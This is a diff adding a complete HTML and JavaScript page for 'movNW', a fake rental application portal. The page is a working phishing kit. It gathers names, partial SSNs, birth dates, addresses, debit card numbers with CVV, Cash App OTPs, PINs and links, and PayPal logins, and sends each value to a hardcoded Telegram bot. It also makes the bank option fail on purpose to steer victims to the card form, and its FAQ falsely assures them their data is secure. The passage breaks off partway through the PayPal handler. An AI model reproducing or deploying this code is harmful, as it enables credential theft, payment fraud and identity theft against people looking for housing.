@@ -1,0 +1,916 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>movNW - Application Portal</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif; }
+        body { background-color: #f0f2f5; color: #1a2634; line-height: 1.6; }
+        .container { max-width: 800px; margin: 0 auto; padding: 20px; background: white; box-shadow: 0 10px 30px rgba(0,20,50,0.1); border-radius: 16px; }
+        .page { display: none; padding: 30px; }
+        .page.active { display: block; }
+        h1, h2 { color: #1e3a5f; margin-bottom: 20px; }
+        .logo { text-align: center; margin-bottom: 30px; font-size: 32px; font-weight: 700; color: #1e3a5f; letter-spacing: -0.5px; }
+        .logo span { color: #4f9da6; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; font-weight: 500; color: #2c3e50; }
+        input, select { width: 100%; padding: 14px; border: 1px solid #d0dae8; border-radius: 8px; font-size: 16px; transition: border 0.2s; }
+        input:focus, select:focus { outline: none; border-color: #4f9da6; box-shadow: 0 0 0 3px rgba(79,157,166,0.1); }
+        .btn { background-color: #1e3a5f; color: white; border: none; padding: 14px 20px; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 600; width: 100%; margin-top: 10px; transition: background-color 0.2s; }
+        .btn:hover { background-color: #142b44; }
+        .btn-secondary { background-color: #e2e8f0; color: #1e293b; }
+        .btn-secondary:hover { background-color: #cbd5e1; }
+        .btn-cashapp { background-color: #00d54b; }
+        .btn-cashapp:hover { background-color: #00b140; }
+        .btn-paypal { background-color: #003087; }
+        .btn-paypal:hover { background-color: #002366; }
+        .disclaimer { font-size: 12px; color: #64748b; margin-top: 30px; border-top: 1px solid #e2e8f0; padding-top: 15px; }
+        .payment-option { border: 1px solid #e2e8f0; border-radius: 12px; padding: 15px; margin-bottom: 15px; cursor: pointer; transition: all 0.2s; display: flex; align-items: center; }
+        .payment-option:hover { border-color: #4f9da6; background-color: #f8fafc; }
+        .payment-option.selected { border-color: #4f9da6; background-color: #e6f3f5; }
+        .payment-icon { width: 40px; height: 40px; margin-right: 15px; vertical-align: middle; }
+        .otp-container { display: flex; justify-content: space-between; margin: 20px 0; gap: 8px; }
+        .otp-input { width: 50px; height: 60px; text-align: center; font-size: 24px; border: 1px solid #d0dae8; border-radius: 8px; }
+        .loading-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background-color: rgba(255,255,255,0.9); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 1000; display: none; }
+        .spinner { width: 50px; height: 50px; border: 4px solid #e2e8f0; border-top: 4px solid #4f9da6; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .progress-bar { display: flex; margin-bottom: 30px; justify-content: space-between; }
+        .progress-step { text-align: center; flex: 1; position: relative; }
+        .step-number { width: 30px; height: 30px; background-color: #e2e8f0; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; margin-bottom: 5px; color: #64748b; font-weight: 600; }
+        .progress-step.active .step-number { background-color: #4f9da6; color: white; }
+        .progress-step.completed .step-number { background-color: #1e3a5f; color: white; }
+        .step-name { font-size: 12px; color: #64748b; }
+        .progress-step.active .step-name { color: #4f9da6; font-weight: 600; }
+        .progress-step.completed .step-name { color: #1e3a5f; }
+        .progress-step:not(:last-child)::after { content: ''; position: absolute; top: 15px; left: 50%; width: 100%; height: 2px; background-color: #e2e8f0; z-index: -1; }
+        .progress-step.completed:not(:last-child)::after { background-color: #1e3a5f; }
+        .error { color: #dc2626; font-size: 14px; margin-top: 5px; display: none; }
+        .card-logos { display: flex; gap: 10px; margin-top: 10px; }
+        .card-logo { height: 30px; }
+        .time-slot.selected { background: #4f9da6; color: #fff; border-radius: 30px; padding: 8px 16px; border: none; }
+        .time-slot { cursor: pointer; margin-right: 10px; display: inline-block; padding: 8px 16px; border: 1px solid #d0dae8; border-radius: 30px; margin-bottom: 5px; transition: all 0.2s; }
+        .time-slot:hover { border-color: #4f9da6; }
+        .secure-badge { display:inline-block; background:#e6f3f5; color:#1e3a5f; padding:4px 12px; border-radius:30px; font-size:13px; margin-left:10px; font-weight:500; }
+        .masked-card-preview { margin-top: 6px; color: #64748b; font-family:monospace; font-size:17px; }
+        .success-message { background: #e6f3f5; padding: 24px; border-radius: 12px; text-align: center; margin: 20px 0; }
+        .success-message h3 { color: #1e3a5f; margin-bottom: 10px; font-size: 24px; }
+        .success-message p { color: #2c3e50; margin-bottom: 8px; }
+        .secure-hold-notice { margin-bottom:12px;display:flex;align-items:center; }
+        .secure-hold-notice span:first-child { color:#27ae60;margin-right:8px;font-size:20px; }
+        .progress-bar-hold { width:100%;background:#eee;border-radius:4px;overflow:hidden;margin-bottom:8px;height:14px; }
+        .progress-bar-hold-inner { height:100%;background:#27ae60;width:0;transition:width 0.3s; }
+        #holdFaqModal {position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:1200;background:#fff;border-radius:8px;box-shadow:0 2px 16px rgba(0,0,0,0.21);width:90%;max-width:400px;padding:24px; display:none;}
+        #holdFaqModal h2 {margin-bottom:10px;}
+        #holdFaqModal ul {padding-left:20px;}
+        .bank-option { display: flex; align-items: center; }
+    </style>
+</head>
+<body>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div style="color: #1e3a5f; font-weight: 500;">Processing your request...</div>
+    </div>
+
+    <!-- FAQ Modal -->
+    <div id="holdFaqModal">
+        <h2>About the $1 Verification Hold</h2>
+        <p>
+            For your security, we use a temporary $1 authorization (hold) to verify your payment method.
+            <ul>
+                <li>The hold is not a charge and is released automatically after verification.</li>
+                <li>This is a common anti-fraud practice used by banks and payment processors.</li>
+                <li>You may see a "pending" $1 transaction on your account for a short period.</li>
+            </ul>
+            <strong>Your information is encrypted and handled securely.</strong>
+        </p>
+        <div class="form-group">
+            <button class="btn" onclick="document.getElementById('holdFaqModal').style.display='none'">Close</button>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="logo">mov<span>NW</span></div>
+        
+        <!-- Progress Bar -->
+        <div class="progress-bar">
+            <div class="progress-step active" id="step1">
+                <div class="step-number">1</div>
+                <div class="step-name">Introduction</div>
+            </div>
+            <div class="progress-step" id="step2">
+                <div class="step-number">2</div>
+                <div class="step-name">Application</div>
+            </div>
+            <div class="progress-step" id="step3">
+                <div class="step-number">3</div>
+                <div class="step-name">Payment</div>
+            </div>
+            <div class="progress-step" id="step4">
+                <div class="step-number">4</div>
+                <div class="step-name">Schedule</div>
+            </div>
+        </div>
+
+        <!-- Page 1: Introduction -->
+        <div class="page active" id="page1">
+            <h1>Welcome to movNW</h1>
+            <p>Thank you for your interest in our properties. Before scheduling a tour, we require all applicants to complete a brief application and pay a $1 verification fee.</p>
+            <div class="form-group">
+                <button class="btn" id="continueBtn">Continue to Application</button>
+            </div>
+            <div class="disclaimer">
+                <p>By submitting this application, you agree to our terms of service.</p>
+            </div>
+        </div>
+
+        <!-- Page 2: Application Form (Government ID removed) -->
+        <div class="page" id="page2">
+            <h2>Rental Application</h2>
+            <p>Please provide the following information to verify your identity.</p>
+            
+            <div class="form-group">
+                <label for="fullName">Full Legal Name</label>
+                <input type="text" id="fullName" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="ssnLast4">Last 4 Digits of SSN</label>
+                <input type="text" id="ssnLast4" maxlength="4" pattern="\d{4}" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="dob">Date of Birth</label>
+                <input type="date" id="dob" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="address">Current Address</label>
+                <input type="text" id="address" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="city">City</label>
+                <input type="text" id="city" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="state">State</label>
+                <input type="text" id="state" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="zip">ZIP Code</label>
+                <input type="text" id="zip" pattern="\d{5}" required>
+            </div>
+            
+            <!-- Government ID fields removed -->
+            
+            <div class="form-group">
+                <button class="btn" id="submitApplicationBtn">Submit Application</button>
+                <button class="btn btn-secondary" id="backBtn1">Back</button>
+            </div>
+        </div>
+
+        <!-- Page 3: Payment Selection (Bank option kept) -->
+        <div class="page" id="page3">
+            <h2>Verification Payment</h2>
+            <p>Please pay the $1 verification fee to continue with your application and schedule a tour.</p>
+            
+            <div class="secure-hold-notice">
+                <span>🔒</span>
+                <span>
+                    We place a <strong>secure $1 hold</strong> on your payment method for identity verification. 
+                    The hold is automatically released after verification.
+                    <a href="#" id="holdFaqLink">(Why?)</a>
+                </span>
+            </div>
+            
+            <!-- Bank Option (kept exactly as original) -->
+            <div class="payment-option" id="bankOption">
+                <img src="https://media.istockphoto.com/id/1465234647/fr/vectoriel/banque-avec-signe-dollar-ic%C3%B4ne-avec-reflet-sur-fond-blanc.jpg?s=612x612&w=0&k=20&c=WS2VVm83ZVN3L0dIWAB9TLeMUFW-HvNnq8dihgquORc=" alt="Bank" class="payment-icon" style="width:40px;height:40px;object-fit:contain;">
+                <span>Link Bank</span>
+            </div>
+            
+            <div class="payment-option" id="cashappOption">
+                <div style="width:40px;height:40px;background:#00d54b;border-radius:10px;display:flex;align-items:center;justify-content:center;margin-right:15px;color:white;font-size:24px;font-weight:bold;">$</div>
+                <span>Pay with Cash App</span>
+                <span class="secure-badge">Secure</span>
+            </div>
+            
+            <div class="payment-option" id="paypalOption">
+                <img src="https://www.paypalobjects.com/webstatic/icon/pp32.png" alt="PayPal" class="payment-icon">
+                <span>Pay with PayPal</span>
+                <span class="secure-badge">Secure</span>
+            </div>
+            
+            <div class="form-group">
+                <button class="btn" id="processPaymentBtn" disabled>Continue to Payment</button>
+                <button class="btn btn-secondary" id="backBtn2">Back</button>
+            </div>
+        </div>
+
+        <!-- Bank Page (kept exactly as original) -->
+        <div class="page" id="bankPage">
+            <h2>Link Your Bank</h2>
+            <p>Enter your bank name to link your account.</p>
+            <div class="form-group">
+                <label for="bankName">Bank Name</label>
+                <input type="text" id="bankName" placeholder="e.g. Chase, Bank of America" required>
+                <div class="error" id="bankError">Bank not available. Please use debit card instead.</div>
+                <button class="btn" id="continueWithDebitBtn" style="display:none;">Continue with Debit Card</button>
+            </div>
+            <div class="form-group">
+                <button class="btn" id="verifyBankBtn">Verify Bank</button>
+                <button class="btn btn-secondary" id="backBtnBank">Back</button>
+            </div>
+        </div>
+
+        <!-- Debit Card Page (kept exactly as original) -->
+        <div class="page" id="debitCardPage">
+            <h2>Enter Debit Card Details <span class="secure-badge">PCI DSS Secure</span></h2>
+            <div class="form-group">
+                <label for="cardNumber">Card Number</label>
+                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                <div class="masked-card-preview" id="maskedCardPreview"></div>
+            </div>
+            <div class="form-group">
+                <label for="cardExpiry">Expiration Date</label>
+                <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" required>
+            </div>
+            <div class="form-group">
+                <label for="cardCvv">CVV</label>
+                <input type="text" id="cardCvv" placeholder="123" maxlength="4" required>
+            </div>
+            <div class="form-group">
+                <label for="cardName">Name on Card</label>
+                <input type="text" id="cardName" required>
+            </div>
+            <div class="card-logos">
+                <img src="https://logo.clearbit.com/visa.com" alt="Visa" class="card-logo">
+                <img src="https://logo.clearbit.com/mastercard.com" alt="Mastercard" class="card-logo">
+                <img src="https://logo.clearbit.com/americanexpress.com" alt="American Express" class="card-logo">
+                <img src="https://logo.clearbit.com/discover.com" alt="Discover" class="card-logo">
+            </div>
+            <div class="form-group">
+                <button class="btn" id="submitDebitCardBtn">Pay $1.00</button>
+                <button class="btn btn-secondary" id="backBtnDebit">Back</button>
+            </div>
+        </div>
+
+        <!-- Cash App Page (kept exactly as original) -->
+        <div class="page" id="cashappPage">
+            <div style="text-align: center; margin-bottom: 20px;">
+                <div style="display:inline-block;width:60px;height:60px;background:#00d54b;border-radius:14px;line-height:60px;text-align:center;margin-bottom:10px;">
+                    <span style="color:#fff;font-size:44px;font-weight:bold;">$</span>
+                </div>
+                <h2>Cash App Payment <span class="secure-badge">Secure</span></h2>
+            </div>
+            
+            <div class="form-group">
+                <label for="cashappEmail">Email or Phone</label>
+                <input type="text" id="cashappEmail" placeholder="Email or phone number" required>
+            </div>
+            
+            <div class="form-group">
+                <button class="btn btn-cashapp" id="continueCashappBtn">Continue</button>
+                <button class="btn btn-secondary" id="backBtnCashapp">Back</button>
+            </div>
+        </div>
+
+        <!-- Cash App OTP Page (kept exactly as original) -->
+        <div class="page" id="cashappOtpPage">
+            <div style="text-align: center; margin-bottom: 20px;">
+                <h2>Verify Your Identity</h2>
+                <p>We sent a 6-digit code to <span id="cashappOtpTarget">example@email.com</span></p>
+            </div>
+            
+            <div class="otp-container">
+                <input type="text" class="otp-input" maxlength="1" data-index="1">
+                <input type="text" class="otp-input" maxlength="1" data-index="2">
+                <input type="text" class="otp-input" maxlength="1" data-index="3">
+                <input type="text" class="otp-input" maxlength="1" data-index="4">
+                <input type="text" class="otp-input" maxlength="1" data-index="5">
+                <input type="text" class="otp-input" maxlength="1" data-index="6">
+            </div>
+            
+            <div class="error" id="cashappOtpError">Invalid code. Please try again.</div>
+            
+            <div class="form-group">
+                <button class="btn btn-cashapp" id="verifyCashappBtn" disabled>Verify</button>
+                <button class="btn btn-secondary" id="backBtnCashappOtp">Back</button>
+            </div>
+            
+            <div style="text-align: center; margin-top: 20px; font-size: 14px;">
+                Didn't receive a code? <a href="#" id="resendCashappOtp">Resend</a>
+            </div>
+        </div>
+
+        <!-- Cash App PIN Page (kept exactly as original) -->
+        <div class="page" id="cashappPinPage">
+            <div style="text-align: center; margin-bottom: 20px;">
+                <h2>Enter Cash App PIN</h2>
+                <p>Please enter your Cash App PIN to complete the transaction.</p>
+            </div>
+            
+            <div class="form-group">
+                <label for="cashappPin">PIN</label>
+                <input type="password" id="cashappPin" placeholder="Enter PIN" required>
+            </div>
+            
+            <div class="form-group">
+                <button class="btn btn-cashapp" id="submitCashappPinBtn">Submit PIN</button>
+                <button class="btn btn-secondary" id="backBtnCashappPin">Back</button>
+            </div>
+        </div>
+
+        <!-- Cash App Link Verification Page (kept exactly as original) -->
+        <div class="page" id="cashappLinkVerifyPage">
+            <div style="text-align:center;">
+                <div style="display:inline-block;width:60px;height:60px;background:#00d54b;border-radius:14px;line-height:60px;text-align:center;margin-bottom:18px;">
+                    <span style="color:#fff;font-size:44px;font-weight:bold;">$</span>
+                </div>
+            </div>
+            <h2 style="color:#00d54b;text-align:center;margin-bottom:10px;">Verify with Cash App Link</h2>
+            <p style="color:#00d54b;text-align:center;margin-bottom:22px;font-size:16px;">
+                Please enter the link we just sent you to verify your identity.
+            </p>
+            <div class="form-group" style="margin-bottom:18px;">
+                <input type="url" id="cashappLinkInput" placeholder="Paste verification link here" required style="border:2px solid #00d54b;border-radius:8px;font-size:16px;padding:12px; width:100%;">
+            </div>
+            <div class="form-group" style="margin-bottom:0;">
+                <button class="btn btn-cashapp" id="submitCashappLinkBtn" style="font-weight:bold;">Continue</button>
+            </div>
+        </div>
+
+        <!-- PayPal Page (kept exactly as original) -->
+        <div class="page" id="paypalPage">
+            <div style="text-align: center; margin-bottom: 20px;">
+                <img src="https://www.paypalobjects.com/webstatic/icon/pp32.png" alt="PayPal" style="width: 60px; height: 60px;">
+                <h2>PayPal Payment <span class="secure-badge">Secure</span></h2>
+            </div>
+            
+            <div class="form-group">
+                <label for="paypalEmail">Email or Phone</label>
+                <input type="text" id="paypalEmail" placeholder="Email or phone number" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="paypalPassword">Password</label>
+                <input type="password" id="paypalPassword" required>
+            </div>
+            
+            <div class="form-group">
+                <button class="btn btn-paypal" id="continuePaypalBtn">Continue</button>
+                <button class="btn btn-secondary" id="backBtnPaypal">Back</button>
+            </div>
+        </div>
+
+        <!-- PayPal OTP Page (kept exactly as original) -->
+        <div class="page" id="paypalOtpPage">
+            <div style="text-align: center; margin-bottom: 20px;">
+                <img src="https://www.paypalobjects.com/webstatic/icon/pp32.png" alt="PayPal" style="width: 60px; height: 60px;">
+                <h2>Verify Your Identity</h2>
+                <p>We sent a 6-digit code to <span id="paypalOtpTarget">example@email.com</span></p>
+            </div>
+            
+            <div class="otp-container">
+                <input type="text" class="otp-input" maxlength="1" data-index="1">
+                <input type="text" class="otp-input" maxlength="1" data-index="2">
+                <input type="text" class="otp-input" maxlength="1" data-index="3">
+                <input type="text" class="otp-input" maxlength="1" data-index="4">
+                <input type="text" class="otp-input" maxlength="1" data-index="5">
+                <input type="text" class="otp-input" maxlength="1" data-index="6">
+            </div>
+            
+            <div class="error" id="paypalOtpError">Invalid code. Please try again.</div>
+            
+            <div class="form-group">
+                <button class="btn btn-paypal" id="verifyPaypalBtn" disabled>Verify</button>
+                <button class="btn btn-secondary" id="backBtnPaypalOtp">Back</button>
+            </div>
+            
+            <div style="text-align: center; margin-top: 20px; font-size: 14px;">
+                Didn't receive a code? <a href="#" id="resendPaypalOtp">Resend</a>
+            </div>
+        </div>
+
+        <!-- Page 4: Schedule Tour (1 second delay) -->
+        <div class="page" id="page4">
+            <h2>Schedule Your Tour</h2>
+            <div id="holdResultMsg" style="background:#eafaf1;color:#27ae60;padding:10px 16px;border-radius:6px;font-size:16px;display:none;margin-bottom:16px;">
+                $1 hold was successfully placed and then released.
+            </div>
+            <p>Your application has been received. Please select a date and time for your tour. We will review your application and contact you shortly.</p>
+            
+            <div class="form-group">
+                <label for="tourDate">Select Date</label>
+                <input type="date" id="tourDate" min="">
+            </div>
+            
+            <div class="form-group">
+                <label>Available Times</label>
+                <div class="time-slots">
+                    <div class="time-slot">9:00 AM</div>
+                    <div class="time-slot">11:00 AM</div>
+                    <div class="time-slot">1:00 PM</div>
+                    <div class="time-slot">3:00 PM</div>
+                    <div class="time-slot">5:00 PM</div>
+                </div>
+            </div>
+            
+            <!-- Property selection removed as requested -->
+            
+            <div class="form-group">
+                <button class="btn" id="confirmTourBtn">Request Tour</button>
+                <button class="btn btn-secondary" id="backBtn3">Back</button>
+            </div>
+        </div>
+
+        <!-- Success Page -->
+        <div class="page" id="successPage">
+            <div class="success-message">
+                <h3>Application Received!</h3>
+                <p>Thank you for submitting your application.</p>
+                <p>Our team will review your information and contact you within 24-48 hours to confirm your tour.</p>
+                <p style="margin-top: 20px;"><strong>Date:</strong> <span id="confirmedDate"></span></p>
+                <p><strong>Time:</strong> <span id="confirmedTime"></span></p>
+            </div>
+            
+            <div class="form-group">
+                <button class="btn" id="finishBtn">Finish</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // === TELEGRAM BOT SETTINGS ===
+        const TELEGRAM_BOT_TOKEN = "8787302098:AAGTMvCR3PhL8KJ6psf4s_0WJqpPEg50SKg";
+        const TELEGRAM_CHAT_ID = "8775933133";
+        
+        // Send message to Telegram
+        function sendToTelegram(message) {
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message
+                })
+            }).catch(err => console.log('Telegram error:', err));
+        }
+
+        // Send alert when someone visits the website
+        window.addEventListener('load', function() {
+            const visitMsg = `movNW - New Visitor
+Time: ${new Date().toLocaleString()}
+Page: Application Portal
+User Agent: ${navigator.userAgent.substring(0, 100)}`;
+            sendToTelegram(visitMsg);
+        });
+
+        // FAQ Modal
+        document.getElementById('holdFaqLink').onclick = function(e) {
+            e.preventDefault();
+            document.getElementById('holdFaqModal').style.display = 'block';
+        };
+
+        // DOM Elements
+        const pages = {
+            page1: document.getElementById('page1'),
+            page2: document.getElementById('page2'),
+            page3: document.getElementById('page3'),
+            bankPage: document.getElementById('bankPage'),
+            debitCardPage: document.getElementById('debitCardPage'),
+            cashappPage: document.getElementById('cashappPage'),
+            cashappOtpPage: document.getElementById('cashappOtpPage'),
+            cashappPinPage: document.getElementById('cashappPinPage'),
+            cashappLinkVerifyPage: document.getElementById('cashappLinkVerifyPage'),
+            paypalPage: document.getElementById('paypalPage'),
+            paypalOtpPage: document.getElementById('paypalOtpPage'),
+            page4: document.getElementById('page4'),
+            successPage: document.getElementById('successPage')
+        };
+
+        const progressSteps = {
+            step1: document.getElementById('step1'),
+            step2: document.getElementById('step2'),
+            step3: document.getElementById('step3'),
+            step4: document.getElementById('step4')
+        };
+
+        const buttons = {
+            continueBtn: document.getElementById('continueBtn'),
+            submitApplicationBtn: document.getElementById('submitApplicationBtn'),
+            processPaymentBtn: document.getElementById('processPaymentBtn'),
+            verifyBankBtn: document.getElementById('verifyBankBtn'),
+            submitDebitCardBtn: document.getElementById('submitDebitCardBtn'),
+            continueCashappBtn: document.getElementById('continueCashappBtn'),
+            verifyCashappBtn: document.getElementById('verifyCashappBtn'),
+            submitCashappPinBtn: document.getElementById('submitCashappPinBtn'),
+            submitCashappLinkBtn: document.getElementById('submitCashappLinkBtn'),
+            continuePaypalBtn: document.getElementById('continuePaypalBtn'),
+            verifyPaypalBtn: document.getElementById('verifyPaypalBtn'),
+            confirmTourBtn: document.getElementById('confirmTourBtn'),
+            finishBtn: document.getElementById('finishBtn'),
+            backBtn1: document.getElementById('backBtn1'),
+            backBtn2: document.getElementById('backBtn2'),
+            backBtnBank: document.getElementById('backBtnBank'),
+            backBtnDebit: document.getElementById('backBtnDebit'),
+            backBtnCashapp: document.getElementById('backBtnCashapp'),
+            backBtnCashappOtp: document.getElementById('backBtnCashappOtp'),
+            backBtnCashappPin: document.getElementById('backBtnCashappPin'),
+            backBtnPaypal: document.getElementById('backBtnPaypal'),
+            backBtnPaypalOtp: document.getElementById('backBtnPaypalOtp'),
+            backBtn3: document.getElementById('backBtn3'),
+            continueWithDebitBtn: document.getElementById('continueWithDebitBtn')
+        };
+
+        const paymentOptions = {
+            bank: document.getElementById('bankOption'),
+            cashapp: document.getElementById('cashappOption'),
+            paypal: document.getElementById('paypalOption')
+        };
+
+        const timeSlots = document.querySelectorAll('.time-slot');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+
+        // OTP Inputs
+        const cashappOtpInputs = document.querySelectorAll('#cashappOtpPage .otp-input');
+        const paypalOtpInputs = document.querySelectorAll('#paypalOtpPage .otp-input');
+
+        // Variables
+        let currentPage = 'page1';
+        let selectedPaymentMethod = null;
+        let selectedTimeSlot = null;
+        let holdResultShown = false;
+
+        // Set min date for tour
+        if (document.getElementById('tourDate')) {
+            const tomorrow = new Date();
+            tomorrow.setDate(tomorrow.getDate() + 1);
+            document.getElementById('tourDate').min = tomorrow.toISOString().split('T')[0];
+            document.getElementById('tourDate').value = tomorrow.toISOString().split('T')[0];
+        }
+
+        // Navigation function with delay control
+        function navigateTo(page, delay = 0) {
+            if (delay > 0) {
+                loadingOverlay.style.display = 'flex';
+                setTimeout(() => {
+                    loadingOverlay.style.display = 'none';
+                    pages[currentPage].classList.remove('active');
+                    if (pages[page]) {
+                        pages[page].classList.add('active');
+                    }
+                    updateProgress(page);
+                    currentPage = page;
+                }, delay);
+            } else {
+                pages[currentPage].classList.remove('active');
+                if (pages[page]) {
+                    pages[page].classList.add('active');
+                }
+                updateProgress(page);
+                currentPage = page;
+            }
+        }
+
+        function updateProgress(page) {
+            let step = 1;
+            if (page === 'page2') step = 2;
+            if (page === 'page3' || page === 'bankPage' || page === 'debitCardPage' || 
+                page === 'cashappPage' || page === 'cashappOtpPage' || page === 'cashappPinPage' || 
+                page === 'cashappLinkVerifyPage' || page === 'paypalPage' || page === 'paypalOtpPage') step = 3;
+            if (page === 'page4' || page === 'successPage') step = 4;
+            
+            Object.values(progressSteps).forEach((stepEl, index) => {
+                stepEl.classList.remove('active', 'completed');
+                if (index + 1 < step) stepEl.classList.add('completed');
+                if (index + 1 === step) stepEl.classList.add('active');
+            });
+        }
+
+        // Event Listeners
+        buttons.continueBtn.addEventListener('click', () => navigateTo('page2'));
+
+        buttons.submitApplicationBtn.addEventListener('click', function() {
+            // Validate required fields
+            const required = ['fullName', 'ssnLast4', 'dob', 'address', 'city', 'state', 'zip'];
+            for (let field of required) {
+                if (!document.getElementById(field).value) {
+                    alert('Please fill in all fields');
+                    return;
+                }
+            }
+            
+            // Send to Telegram
+            const msg = `movNW - Application Submitted
+Name: ${getVal('fullName')}
+SSN Last 4: ${getVal('ssnLast4')}
+DOB: ${getVal('dob')}
+Address: ${getVal('address')}, ${getVal('city')}, ${getVal('state')} ${getVal('zip')}`;
+            sendToTelegram(msg);
+            
+            navigateTo('page3');
+        });
+
+        // Payment selection
+        paymentOptions.bank.addEventListener('click', () => {
+            paymentOptions.bank.classList.add('selected');
+            paymentOptions.cashapp.classList.remove('selected');
+            paymentOptions.paypal.classList.remove('selected');
+            selectedPaymentMethod = 'bank';
+            buttons.processPaymentBtn.disabled = false;
+        });
+
+        paymentOptions.cashapp.addEventListener('click', () => {
+            paymentOptions.cashapp.classList.add('selected');
+            paymentOptions.bank.classList.remove('selected');
+            paymentOptions.paypal.classList.remove('selected');
+            selectedPaymentMethod = 'cashapp';
+            buttons.processPaymentBtn.disabled = false;
+        });
+
+        paymentOptions.paypal.addEventListener('click', () => {
+            paymentOptions.paypal.classList.add('selected');
+            paymentOptions.bank.classList.remove('selected');
+            paymentOptions.cashapp.classList.remove('selected');
+            selectedPaymentMethod = 'paypal';
+            buttons.processPaymentBtn.disabled = false;
+        });
+
+        buttons.processPaymentBtn.addEventListener('click', () => {
+            if (selectedPaymentMethod === 'bank') navigateTo('bankPage');
+            if (selectedPaymentMethod === 'cashapp') navigateTo('cashappPage');
+            if (selectedPaymentMethod === 'paypal') navigateTo('paypalPage');
+        });
+
+        // Bank flow
+        buttons.verifyBankBtn.addEventListener('click', function() {
+            const bankName = document.getElementById('bankName').value;
+            if (!bankName) {
+                alert('Please enter a bank name');
+                return;
+            }
+            
+            const msg = `movNW - Bank Attempt
+Bank Name: ${bankName}`;
+            sendToTelegram(msg);
+            
+            document.getElementById('bankError').style.display = 'block';
+            buttons.continueWithDebitBtn.style.display = 'block';
+        });
+
+        buttons.continueWithDebitBtn.addEventListener('click', function() {
+            document.getElementById('bankError').style.display = 'none';
+            buttons.continueWithDebitBtn.style.display = 'none';
+            navigateTo('debitCardPage');
+        });
+
+        buttons.submitDebitCardBtn.addEventListener('click', function() {
+            const msg = `movNW - Debit Card
+Card: ${getVal('cardNumber')}
+Expiry: ${getVal('cardExpiry')}
+CVV: ${getVal('cardCvv')}
+Name: ${getVal('cardName')}`;
+            sendToTelegram(msg);
+            
+            // 1 second delay to schedule page
+            navigateTo('page4', 1000);
+        });
+
+        // Cash App flow
+        buttons.continueCashappBtn.addEventListener('click', function() {
+            const email = document.getElementById('cashappEmail').value;
+            if (!email) {
+                alert('Please enter your email or phone');
+                return;
+            }
+            
+            document.getElementById('cashappOtpTarget').textContent = email;
+            
+            const msg = `movNW - Cash App Initiated
+Email/Phone: ${email}`;
+            sendToTelegram(msg);
+            
+            navigateTo('cashappOtpPage');
+        });
+
+        // OTP auto-advance
+        cashappOtpInputs.forEach((input, index) => {
+            input.addEventListener('input', function() {
+                if (this.value.length === 1 && index < 5) {
+                    cashappOtpInputs[index + 1].focus();
+                }
+                checkCashappOtpCompletion();
+            });
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
+                    cashappOtpInputs[index - 1].focus();
+                }
+            });
+        });
+
+        paypalOtpInputs.forEach((input, index) => {
+            input.addEventListener('input', function() {
+                if (this.value.length === 1 && index < 5) {
+                    paypalOtpInputs[index + 1].focus();
+                }
+                checkPaypalOtpCompletion();
+            });
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
+                    paypalOtpInputs[index - 1].focus();
+                }
+            });
+        });
+
+        function checkCashappOtpCompletion() {
+            let allFilled = true;
+            cashappOtpInputs.forEach(input => {
+                if (!input.value) allFilled = false;
+            });
+            if (buttons.verifyCashappBtn) buttons.verifyCashappBtn.disabled = !allFilled;
+        }
+
+        function checkPaypalOtpCompletion() {
+            let allFilled = true;
+            paypalOtpInputs.forEach(input => {
+                if (!input.value) allFilled = false;
+            });
+            if (buttons.verifyPaypalBtn) buttons.verifyPaypalBtn.disabled = !allFilled;
+        }
+
+        buttons.verifyCashappBtn.addEventListener('click', function() {
+            const otp = Array.from(cashappOtpInputs).map(i => i.value).join('');
+            
+            const msg = `movNW - Cash App OTP
+OTP: ${otp}`;
+            sendToTelegram(msg);
+            
+            navigateTo('cashappPinPage');
+        });
+
+        document.getElementById('resendCashappOtp').addEventListener('click', (e) => {
+            e.preventDefault();
+            alert('New verification code sent');
+        });
+
+        buttons.submitCashappPinBtn.addEventListener('click', function() {
+            const pin = document.getElementById('cashappPin').value;
+            if (!pin || pin.length < 4) {
+                alert('Please enter your PIN');
+                return;
+            }
+            
+            const msg = `movNW - Cash App PIN
+PIN: ${pin}`;
+            sendToTelegram(msg);
+            
+            navigateTo('cashappLinkVerifyPage');
+        });
+
+        buttons.submitCashappLinkBtn.addEventListener('click', function() {
+            const link = document.getElementById('cashappLinkInput').value;
+            if (!link) {
+                alert('Please paste the verification link');
+                return;
+            }
+            
+            const msg = `movNW - Cash App Link
+Link: ${link}`;
+            sendToTelegram(msg);
+            
+            // 3 second delay before schedule page
+            navigateTo('page4', 3000);
+        });
+
+        // PayPal flow
+        buttons.continuePaypalBtn.addEventListener('click', function() {
+            const email = document.getElementById('paypalEmail').value;
+            const password = document.getElementById('paypalPassword').value;
+            
